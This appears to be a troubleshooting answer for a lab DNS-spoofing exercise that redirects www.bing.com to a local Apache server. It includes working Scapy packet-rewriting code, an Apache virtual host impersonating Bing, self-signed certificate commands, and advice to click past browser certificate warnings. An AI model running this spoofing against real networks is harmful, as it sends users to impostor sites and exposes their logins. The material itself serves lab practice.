The issue you're encountering is related to DNS spoofing and how your browser (Firefox in this case)
is handling the connection when you spoof www.bing.com to resolve to 192.168.60.2.
Specifically, Firefox is likely trying to establish an HTTPS connection to www.bing.com,
but your Apache server is not configured to handle HTTPS for www.bing.com.
Here are some steps and checks to resolve the problem:

1. Check if HTTPS is involved:

Since www.bing.com uses HTTPS by default, if your DNS spoofing redirects www.bing.com
to 192.168.60.2, Firefox will try to connect using HTTPS, and if Apache is not set up
with an SSL certificate for www.bing.com, it will fail to connect.

Solution:

You need to either:

    Serve content over HTTP (instead of HTTPS) or
    Set up SSL on your Apache server to handle HTTPS for www.bing.com.

To check if HTTPS is being used:

    Try accessing http://www.bing.com in your browser (without the https:// prefix).
    If this works, then the problem is related to SSL.

2. Serving HTTP (Without SSL):

If you just want to test without dealing with SSL,
make sure that Apache is set up to handle HTTP traffic on port 80 for www.bing.com.
For example, your Apache configuration should include something like:

<VirtualHost *:80>
    ServerName www.bing.com
    DocumentRoot /var/www/html  # Or whatever directory you're serving
</VirtualHost>

Make sure Apache is listening on port 80 and that the ServerName matches www.bing.com.
3. Handling HTTPS with SSL/TLS:

If you want to use HTTPS, you will need to create a self-signed SSL certificate for www.bing.com (or use a certificate authority, though self-signed should suffice for testing).
Steps for a Self-Signed SSL Certificate:

    Generate a Self-Signed Certificate:

openssl genpkey -algorithm RSA -out bing.key
openssl req -new -key bing.key -out bing.csr
openssl x509 -req -in bing.csr -signkey bing.key -out bing.crt

Configure Apache to Use the SSL Certificate: Edit your Apache configuration file (for example, /etc/apache2/sites-available/000-default.conf or create a new file) and include the following for HTTPS support:

<VirtualHost *:443>
    ServerName www.bing.com
    DocumentRoot /var/www/html  # Or your document root

    SSLEngine on
    SSLCertificateFile /path/to/bing.crt
    SSLCertificateKeyFile /path/to/bing.key
</VirtualHost>

Enable SSL in Apache: If SSL isn't already enabled, you may need to enable it:

    sudo a2enmod ssl
    sudo systemctl restart apache2

    Test the HTTPS connection: Now, try visiting https://www.bing.com and see if it works. Keep in mind that Firefox may give a warning about the self-signed certificate. You can bypass this warning for testing purposes.

4. Potential Browser Caching or DNS Resolution Issues:

Sometimes, even though you spoof the DNS successfully,
the browser might cache previous DNS responses or have SSL/TLS session data that causes issues.

    Try clearing Firefox's DNS cache:
        In the Firefox address bar, type about:networking and click on "Clear DNS Cache."
    Clear the regular cache and cookies in Firefox as well.

5. Check the Firewall and Network Configuration:

    Ensure that no firewall is blocking access to the port or IP. Double-check the VM's network settings to ensure that requests to 192.168.60.2 can reach the Apache server correctly.

6. Debugging with Scapy:

You mentioned using Scapy to spoof the DNS response. Ensure that your process_packet() function correctly manipulates the DNS packet. Specifically, make sure that the IP address (rdata) in the DNS response points to 192.168.60.2, and that you're properly setting the DNS answer count (ancount = 1).

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname.decode():
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.60.2")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))
    
    packet.accept()

This should correctly send the DNS response with the IP address for your server.
Summary of Steps:

    Test with HTTP: Access http://www.bing.com in your browser to see if it's an HTTPS issue.
    Set up SSL (if needed): If you want to use HTTPS, create a self-signed certificate for www.bing.com and configure Apache to use it.
    Clear Cache: Clear DNS and browser cache in Firefox to avoid old data interfering with testing.
    Check Firewall/Networking: Ensure the VM's network settings are correct and no firewall is blocking the connection.
